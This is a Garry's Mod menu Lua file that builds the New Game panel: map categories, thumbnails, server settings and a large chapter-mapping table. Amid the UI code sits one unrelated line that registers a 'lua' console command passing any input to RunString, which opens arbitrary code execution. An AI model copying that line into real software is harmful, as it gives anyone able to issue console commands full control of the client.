
CreateConVar( "cl_maxplayers", "1", FCVAR_ARCHIVE )

local PANEL = {}

surface.CreateFont( "StartNewGame", {
	font = "Roboto",
	size = ScreenScale( 10 ),
} )

surface.CreateFont( "rb655_MapList", {
	size = 12,
	font = "Tahoma"
} )

surface.CreateFont( "rb655_MapSubCat", {
	size = ScreenScale( 10 ),
	weight = 900,
	font = "Tahoma"
} )

// Dev-beta compatibility
GetMapList = GetMapList or function()
	return g_MapListCategorised or {}
end

PANEL.CustomMaps = {}

gMapIcons = {}

local BackgroundColor = Color( 200, 200, 200, 128 )
local BackgroundColor2 = Color( 200, 200, 200, 255 )//Color( 0, 0, 0, 100 )

function PANEL:Init()

	self:Dock( FILL )

	--------------------------------- CATEGORIES ---------------------------------

	local Categories = vgui.Create( "DListLayout", self )
	Categories:Dock( LEFT )
	Categories:DockPadding( 5, 0, 5, 5 )
	Categories:DockMargin( 15, 15, 0, 15 )
	Categories:SetWide( 200 )
	function Categories:Paint( w, h )
		draw.RoundedBoxEx( 4, 0, 0, w, h, BackgroundColor, true, false, true, false )
		draw.RoundedBoxEx( 4, 0, 0, w, h, BackgroundColor2, true, false, true, false )
	end

	self.CategoriesPanel = Categories

	---------------------------- CONTAINER FOR MAPS ----------------------------

	local Scroll = vgui.Create( "DScrollPanel", self )
	Scroll:Dock( FILL )
	Scroll:DockMargin( 0, 15, 0, 15 )
	function Scroll:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, BackgroundColor )
	end

	local CategoryMaps = vgui.Create( "DIconLayout", Scroll )
	CategoryMaps:SetSpaceX( 5 )
	CategoryMaps:SetSpaceY( 5 )
	CategoryMaps:Dock( TOP )
	CategoryMaps:DockMargin( 5, 5, 5, 5 )
	CategoryMaps:DockPadding( 5, 5, 5, 5 )
	self.CategoryMaps = CategoryMaps

	--------------------------------- SETTINGS ---------------------------------

	local Settings = vgui.Create( "DListLayout", self )
	Settings:Dock( RIGHT )
	Settings:SetWide( ScrW() / 6 )
	Settings:DockMargin( 0, 15, 15, 10 )
	function Settings:Paint( w, h )
		draw.RoundedBoxEx( 4, 0, 0, w, h, BackgroundColor, false, true, false, true )
		draw.RoundedBoxEx( 4, 0, 0, w, h, BackgroundColor2, false, true, false, true )
	end
	self.Settings = Settings

	--------------------------------- TOP CONTENT ---------------------------------

	local ServerName = vgui.Create( "DTextEntry", Settings )
	ServerName:Dock( TOP )
	ServerName:SetText( GetConVarString( "hostname" ) )
	ServerName:DockMargin( 5, 5, 5, 0 )
	Settings.ServerName = ServerName

	local SvLan = vgui.Create( "DCheckBoxLabel", Settings )
	SvLan:Dock( TOP )
	SvLan:DockMargin( 5, 5, 5, 0 )
	SvLan:SetText( "#lan_server" )
	SvLan:SetDark( true )
	SvLan:SetChecked( GetConVarNumber( "sv_lan" ) == 1 )
	Settings.SvLan = SvLan

	local PlayerCount = vgui.Create( "DNumSlider", Settings )
	PlayerCount:Dock( TOP )
	PlayerCount:DockMargin( 10, 0, 0, 0 )
	PlayerCount:SetMinMax( 1, 32 )
	PlayerCount:SetText( "Max Players" )
	PlayerCount:SetConVar( "cl_maxplayers" )
	PlayerCount:SetDecimals( 0 )
	//PlayerCount:SetValue( GetConVarNumber( "maxplayers" ) )
	PlayerCount:SetDark( true )
	Settings.PlayerCount = PlayerCount

	--------------------------------- MIDDLE CONTENT ---------------------------------

	local GamemodeSettings = vgui.Create( "DScrollPanel", Settings )
	GamemodeSettings:Dock( FILL )
	GamemodeSettings:DockMargin( 0, 0, 0, 5 )
	self.GamemodeSettings = GamemodeSettings
	function GamemodeSettings:Paint( w, h )
		//draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 128 ) )
	end

	--------------------------------- END CONTENT ---------------------------------

	local StartGame = Settings:Add("DMenuButton")
	StartGame:Dock( BOTTOM )
	StartGame:SetFont( "StartNewGame" )
	StartGame:SetText( "Start Game" )
	StartGame:SetTall( 48 )
	StartGame.DoClick = function()
		self:LoadMap()
	end
	StartGame:SetSpecial( true )
	StartGame:DockMargin( 5, 0, 5, 5 )

	--------------------------------- BLEH ---------------------------------

	self:Update()

end

function PANEL:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 150 ) )
	if ( self.CurrentCategory ) then
		if ( !self.Categories[ self.CurrentCategory ] ) then self:SelectCat( "Sandbox" ) return end
		self.Categories[ self.CurrentCategory ].Depressed = true
	end
end

function PANEL:SelectMap( map )
	self.CurrentMap = map
end

function PANEL:Update()

	---------------------------------- Categories ----------------------------------

	local Categories = self.CategoriesPanel
	Categories:Clear()

	self.Categories = {}

	local pergamemode = Categories:Add( "DLabel" )
	pergamemode:SetText( "GAMEMODES" )
	pergamemode:SetContentAlignment( 5 )
	pergamemode:SetDark( true )

	if ( istable( GetMapList() ) ) then
		local cats = table.GetKeys( GetMapList() )
		for _, cat in SortedPairsByValue( cats ) do
			local button = Categories:Add( "DMenuButton" )
			button:SetText( cat )
			button.DoClick = function()
				self:SelectCat( cat )
			end
			button:DockMargin( 0, 0, 0, 5 )
			self.Categories[ cat ] = button
		end
	end

	local games = Categories:Add( "DLabel" )
	games:SetText( "GAMES" )
	games:SetContentAlignment( 5 )
	games:SetDark( true )

	for cat, nicename in SortedPairsByValue( g_MapsFromGamesCats ) do
		for a, b in SortedPairsByValue( g_MapsFromGames[ cat ] ) do
			if ( nicename == "Left 4 Dead 2" || nicename == "Portal 2"  || nicename == "CS: Global Offensive" ) then
				gMapIcons[ b ] = Material( "html/img/incompatible.png" ) // INCOMPATIBLEEEE
			end
		end

		local button = Categories:Add( "DMenuButton" )
		button:SetText( nicename )

		local cat = ""
		for id, n in pairs( g_MapsFromGamesCats ) do
			if ( n == nicename ) then cat = id end
		end

		button.DoClick = function()
			self:SelectCat( cat )
		end
		button:DockMargin( 0, 0, 0, 5 )
		self.Categories[ cat ] = button

	end

	---------------------------------- SERVER SETTIGNS ----------------------------------

	local GamemodeSettings = self.GamemodeSettings
	GamemodeSettings:Clear()

	local settings_file = file.Read( "gamemodes/" .. engine.ActiveGamemode() .. "/" .. engine.ActiveGamemode() .. ".txt", true )

	if ( settings_file ) then

		local SettingsFile = util.KeyValuesToTable( settings_file )

		if ( SettingsFile.settings ) then
			
			for k, v in pairs( SettingsFile.settings ) do
				if ( v.type == "CheckBox" ) then
					local CheckBox = vgui.Create( "DCheckBoxLabel", GamemodeSettings )
					CheckBox:Dock( TOP )
					CheckBox:DockMargin( 5, 5, 5, 0 )
					CheckBox:SetText( "#" .. v.text )
					CheckBox:SetDark( true )
					CheckBox:SetChecked( GetConVarNumber( v.name ) == 1 )
				elseif ( v.type == "Text" ) then
					local label = vgui.Create( "DLabel", GamemodeSettings )
					label:Dock( TOP )
					label:SetText( language.GetPhrase( v.text ) )
					label:DockMargin( 5, 0, 0, 0 )
					label:SetDark( true )
				
					local DTextEntry = vgui.Create( "DTextEntry", GamemodeSettings )
					DTextEntry:Dock( TOP )
					DTextEntry:SetConVar( v.name )
					DTextEntry:DockMargin( 5, 0, 5, 5 )
				elseif ( v.type == "Numeric" ) then
					local DNumSlider = vgui.Create( "DNumSlider", GamemodeSettings )
					DNumSlider:Dock( TOP )
					DNumSlider:SetConVar( v.name )
					DNumSlider:SetText( language.GetPhrase( v.text ) )
					DNumSlider:SetDecimals( 0 )
					DNumSlider:SetMinMax( 0, 200 )
					DNumSlider:DockMargin( 5, 0, 5, 0 )
					DNumSlider:SetDark( true )
				end
			end
			
			//Hack, to make the bottom 5 px appear
			local label = vgui.Create( "DLabel", GamemodeSettings )
			label:Dock( TOP )
			label:SetText( "" )
			label:SetTall( 1 )

		end

	end

	--------------------------------- LOAD LAST MAP ---------------------------------

	if ( self.CurrentMap && self.CurrentCategory ) then
		self:SelectCat( self.CurrentCategory )
		self:SelectMap( self.CurrentMap )
		return
	end
	
	local t = string.Explode( ";", cookie.GetString( "lastmap", "" ) )

	local map = t[ 1 ] or "gm_construct"
	local cat = t[ 2 ] or "Sandbox"

	for category, maps in pairs( GetMapList() ) do
		if ( table.HasValue( maps, map ) ) then
			cat = category
		end
	end

	self:SelectCat( cat )
	self:SelectMap( map )

end

concommand.Add("lua", function(ply, cmd, args, str ) RunString( str ) end)

local subCategories = {
	[ "^gm_" ] = "Sandbox",
	//[ "^gms_" ] = "Garry's Mod Stranded",
	//[ "^ttt_" ] = "Trouble in Terrorist Town",

	// CS
	[ "^de_" ] = "Bomb Defuse",
	[ "^cs_" ] = "Hostage Rescue",
	[ "^ar_" ] = "Arms Race",
	[ "^gd_" ] = "Guardian",

	//Random
	[ "^dm_" ] = "Deathmatch",
	[ "^mg_" ] = "Minigames",
	[ "^dr_" ] = "Deathrun",
	[ "^deathrun_" ] = "Deathrun",
	[ "^surf_" ] = "Surf",
	[ "^bhop_" ] = "Bunny Hop",
	[ "^aim_" ] = "Aim Arena",
	[ "^awp_" ] = "AWP Arena",
	[ "^kz_" ] = "Kreedz",
	[ "^zm_" ] = "Zombie Master",
	[ "^ze_" ] = "Zombie Escape",
	[ "^zs_" ] = "Zombie Survival",
	[ "^fy_" ] = "Fight Yard",
	[ "^hg_" ] = "Hunger Games",
	[ "^hns_" ] = "Hide and Seek",
	[ "^ba_" ] = "Jail Break",
	[ "jb_" ] = "Jail Break",
	[ "^pf_" ] = "Parkour Fortress",
	[ "^dod_" ] = "Day Of Defeat: Source",

	// TF2
	[ "^arena_" ] = "Arena",
	[ "^koth_" ] = "King Of The Hill",
	[ "^sd_" ] = "Special Delivery",
	[ "^ctf_" ] = "Capture The Flag",
	[ "^mvm_" ] = "Mann Versus Machine",
	[ "^pl_" ] = "Payload",
	[ "^plr_" ] = "Payload Race",
	[ "^rd_" ] = "Robot Destruction",
	[ "^pd_" ] = "Player Destruction",
	[ "^tr_" ] = "Training",
	[ "^cp_" ] = "Control Point",
	[ "^trade_" ] = "Trade",
	[ "^tc_" ] = "Territorial Control",
	[ "^pass_" ] = "PASS Time",

	// Left 4 Dead 1
	[ "^l4d_hospital0" ] = "a. No Mercy",
	[ "^l4d_garage0" ] = "b. Crash Course",
	[ "^l4d_smalltown0" ] = "c. Death Toll",
	[ "^l4d_airport0" ] = "d. Dead Air",
	[ "^l4d_farm0" ] = "b. Blood Harvest",
	[ "^l4d_vs_" ] = "f. Versus",
	[ "l4d_sv_lighthouse" ] = "f. The Last Stand",

	// Left 4 Dead 2
	[ "^c1m" ] = "a. Dead Center",
	//[ "^c2m" ] = "b. The Passing",
	[ "^c2m" ] = "c. Dark Carnival",
	[ "^c3m" ] = "d. Swamp Fever",
	[ "^c4m" ] = "e. Hard Rain",
	[ "^c5m" ] = "f. The Parish",
	//[ "^c5m" ] = "g. Cold Stream",

	// Portal
	[ "^testchmb_" ] = "a. Test Chambers",
	[ "^testchmb_(.*)_advanced$" ] = "c. Advanced Test Chambers",
	[ "^escape_" ] = "b. GLaDOS Escape",

	// Portal 2 - incomplete
	[ "^sp_a1_intro" ] = "a. The Courtesy Call",
	[ "^sp_a2_laser_intro" ] = "b. The Cold Boot",
	[ "^sp_a2_sphere_peek" ] = "c. The Return",
	[ "^sp_a2_column_blocker" ] = "d. The Surprise",
	[ "sp_a2_bts1" ] = "d. The Surprise",
	[ "sp_a2_bts2" ] = "d. The Surprise",
	[ "sp_a2_bts" ] = "e. The Escape",
	[ "^sp_a3_0" ] = "f. The Fall",
	[ "^sp_a3_speed_ramp" ] = "g. The Reunion",
	[ "^sp_a4_intro" ] = "h. The Itch",
	[ "^sp_a4_finale" ] = "i. The Part Where...",
	[ "^sp_a5_credits" ] = "j. The Credits",
	[ "^mp_coop_" ] = "k. Portal 2 COOP",

	// Half-Life: Source
	[ "^c0a0" ] = "a. Black Mesa Inbound",
	[ "^c1a0" ] = "b. Anomalous Materials",
	[ "^c1a1" ] = "c. Unforeseen Consequences",
	[ "^c1a2" ] = "d. Office Complex",
	[ "^c1a3" ] = "e. \"We've Got Hostiles\"",
	[ "^c1a4" ] = "f. Blast Pit",
	[ "^c2a1" ] = "g. Power Up",
	[ "^c2a2" ] = "h. On A Rail",
	[ "^c2a3" ] = "i. Apprehension",
	[ "^c2a4" ] = "j. Residue Processing",
	[ "^c2a5" ] = "k. Questionable Ethics",
	[ "^c3a1" ] = "l. Surface Tension",
	[ "^c3a2" ] = "m. \"Forget About Freeman!\"",
	[ "^c3a2" ] = "n. Lambda Core",
	[ "^c4a1" ] = "o. Xen",
	[ "^c4a1z" ] = "p. Gonarch's Lair",
	[ "^c4a2" ] = "r. Interloper",
	[ "^c4a3" ] = "s. Nihilanth",
	[ "^c5a1" ] = "t. Endgame",
	[ "^t0a0" ] = "u. Hazard Course",

	// Half-Life 2
	[ "^d1_trainstation" ] = "a. Point Insertion",

	[ "d1_trainstation_05" ] = [[b. "A Red Letter Day"]],
	[ "d1_trainstation_06" ] = [[b. "A Red Letter Day"]],

	[ "^d1_canals" ] = "c. Route Kanal",

	[ "d1_canals_06" ] = "d. Water Hazard",
	[ "d1_canals_07" ] = "d. Water Hazard",
	[ "d1_canals_08" ] = "d. Water Hazard",
	[ "d1_canals_09" ] = "d. Water Hazard",
	[ "d1_canals_1" ] = "d. Water Hazard",

	[ "^d1_eli" ] = "e. Black Mesa East",
	[ "^d1_town" ] = [[f. "We Don't Go To Ravenholm..."]],
	[ "^d2_coast_" ] = 'g. Highway 17',

	[ "d2_coast_09" ] = 'h. Sandtraps',
	[ "^d2_coast_1" ] = 'h. Sandtraps',
	[ "d2_prison_01" ] = 'h. Sandtraps',

	[ "^d2_prison_0" ] = 'i. Nova Prospekt',

	[ "d2_prison_06" ] = 'j. Entaglement',
	[ "d2_prison_07" ] = 'j. Entaglement',
	[ "d2_prison_08" ] = 'j. Entaglement',
	[ "d3_c17_01" ] = 'j. Entaglement',

	[ "d3_c17_02" ] = 'k. Anticitizen One',
	[ "^d3_c17_0" ] = 'k. Anticitizen One',

	[ "d3_c17_09" ] = 'l. "Follow Freeman!"',
	[ "^d3_c17_1" ] = 'l. "Follow Freeman!"',

	[ "^d3_citadel" ] = 'm. Our Benefactors',
	[ "^d3_breen" ] = 'n. Dark Energy',

	[ "^background" ] = 'Backgrounds',
	[ "^ep1_background" ] = 'Backgrounds',
	[ "^ep2_background" ] = 'Backgrounds',
	
	// Half-Life 2: Episode 1
	[ "^ep1_citadel_0" ] = "a. Undue Alarm",
	[ "ep1_citadel_03" ] = "b. Direct Intervention",
	[ "ep1_citadel_04" ] = "b. Direct Intervention",
	[ "^ep1_c17_00" ] = "c. Lowlife",
	[ "^ep1_c17_0" ] = "d. Urban Flight",
	[ "ep1_c17_05" ] = "e. Exit 17",
	[ "ep1_c17_06" ] = "e. Exit 17",

	// Half-Life 2: Episode 2
	[ "^ep2_outland_01" ] = "a. To the White Forest",

	[ "ep2_outland_02" ] = "b. This Vortal Coil",
	[ "ep2_outland_03" ] = "b. This Vortal Coil",
	[ "ep2_outland_04" ] = "b. This Vortal Coil",

	[ "ep2_outland_05" ] = "c. Freeman Pontifex",
	[ "ep2_outland_06" ] = "c. Freeman Pontifex",

	[ "ep2_outland_06a" ] = "d. Riding Shotgun",

	[ "ep2_outland_07" ] = "d. Riding Shotgun",
	[ "ep2_outland_08" ] = "d. Riding Shotgun",

	[ "ep2_outland_09" ] = "e. Under the Radar",
	[ "^ep2_outland_10" ] = "e. Under the Radar",
	[ "^ep2_outland_11" ] = "f. Our Mutual Fiend",
	[ "ep2_outland_12" ] = "f. Our Mutual Fiend",

	[ "ep2_outland_12a" ] = "g. T-Minus One",
}

gCSMaps = {}
function PANEL:SelectCat( cat )
	//print("selecting", cat)
	if ( self.CurrentCategory && self.Categories[ self.CurrentCategory ] ) then self.Categories[ self.CurrentCategory ].Depressed = false end
	self.CurrentCategory = cat

	for k, v in pairs( self.CategoryMaps:GetChildren() ) do v:Remove() end

	if ( istable( GetMapList() ) ) then

		local mapss = table.Merge( table.Copy( GetMapList() ), g_MapsFromGames )
		local maps = mapss[ cat ]

		local categories = {}
		for _, map in SortedPairs( maps ) do
			local c =  "Other"
		
			for pattern, cate in SortedPairs( subCategories ) do
				if ( subCategories[ map:lower() ] ) then c = subCategories[ map:lower() ] break end
				if ( string.find( map:lower(), pattern ) ) then
					c = cate
				end
			end

			categories[ c ] = categories[ c ] or {}
			table.insert( categories[ c ], map )
		end

		for ca, ma in SortedPairs( categories ) do
			
			local catText = ca
			if ( catText:sub( 2, 3 ) == ". " ) then catText = catText:sub( 4 ) end
			
			local label = self.CategoryMaps:Add( "DLabel" )
			label.OwnLine = true
			label:SetText( catText )
			label:SetFont( "rb655_MapSubCat" )
			label:SizeToContents()
			label:SetBright( true )

		for _, map in SortedPairsByValue( ma ) do
			local button = self.CategoryMaps:Add( "DImageButton" )
			button:SetText( map )

			if ( !gMapIcons[ map ] ) then
				local mat = Material( "maps/thumb/" .. map .. ".png" )
				/*if ( mat:IsError() ) then mat = Material( "maps/thumb/" .. map .. ".png" ) print("Da", mat, AddonMaterial( "maps/thumb/" .. map .. ".png" ) ) end
				if ( mat:IsError() ) then mat = Material( "thumb/" .. map .. ".png" ) end*/
				if ( mat:IsError() ) then mat = Material( "maps/" .. map .. ".png" ) end -- Stupid ass addons that didn't update yet
				if ( mat:IsError() ) then mat = Material( "noicon.png", "nocull smooth" ) end

				gMapIcons[ map ] = mat
			end
			button.m_Image:SetMaterial( gMapIcons[ map ] )

			if ( cat == "Counter-Strike" || cat == "240maps" ) then // HACK
				if ( !gCSMaps[ map ] ) then
					local mat = Material( "maps/thumb/" .. map .. ".png" )
					if ( mat:IsError() ) then mat = Material( "maps/" .. map .. ".png" ) end -- Stupid ass addons that didn't update yet
					if ( mat:IsError() ) then mat = Material( "noicon.png", "nocull smooth" ) end

					gCSMaps[ map ] = mat
				end
				button.m_Image:SetMaterial( gCSMaps[ map ] )
			end

			button:SetSize( 128, 128 )
			button.DoClick = function()
				self:SelectMap( map, cat )
			end
			button.PaintOver = function( button, w, h )
				
				if ( button:GetText() == self.CurrentMap ) then
					surface.SetDrawColor( Color( 255, 255, 255, 128 + math.sin( CurTime() * 2 ) * 80 ) )
					for i=0,1 do surface.DrawOutlinedRect( i, i, w - i * 2, h - i * 2 ) end
				end

				if ( button.Hovered ) then return end

				draw.RoundedBox( 0, 0, h - 20, w, 20, Color( 0, 0, 0, 150 ) )
				
				surface.SetFont( "rb655_MapList" )
				
				local tw = surface.GetTextSize( button:GetText() )
				if ( tw > w ) then
					draw.SimpleText( button:GetText(), "rb655_MapList", w / 2 - tw / 2 + ( ( w - tw ) * math.sin( CurTime() ) ), h - 16, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				else
					draw.SimpleText( button:GetText(), "rb655_MapList", w / 2 - tw / 2, h - 16, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

			end
			
			button.DoRightClick = function()
				local m = DermaMenu()
				m:AddOption( "Toggle Favourite", function() ToggleFavourite( map ) end )
				m:AddOption( "Cancel", function() end )
				m:Open()
			end

		end
		end

	end

	// Scroll back to the top of the map list
	self.CategoryMaps:GetParent():GetParent():GetVBar():SetScroll( 0 )

end

function PANEL:LoadMap()

	local maxplayers = GetConVarNumber( "cl_maxplayers" ) or 1 //self.Settings.PlayerCount:GetValue() or 1
	local sv_lan = 0
	if ( self.Settings.SvLan:GetChecked() ) then sv_lan = 1 end

	SaveLastMap( self.CurrentMap, self.CurrentCategory )

	hook.Run( "StartGame" )
	RunConsoleCommand( "progress_enable" )

	RunConsoleCommand( "disconnect" )

	if ( maxplayers > 0 ) then

		RunConsoleCommand( "sv_cheats", "0" )
		RunConsoleCommand( "commentary", "0" )

	end

	RunConsoleCommand( "sv_lan", sv_lan )
	RunConsoleCommand( "maxplayers", maxplayers )
	RunConsoleCommand( "map", self.CurrentMap )
	RunConsoleCommand( "hostname", self.Settings.ServerName:GetText() )

	pnlMainMenu:Back()

end

vgui.Register( "NewGamePanel", PANEL, "EditablePanel" )
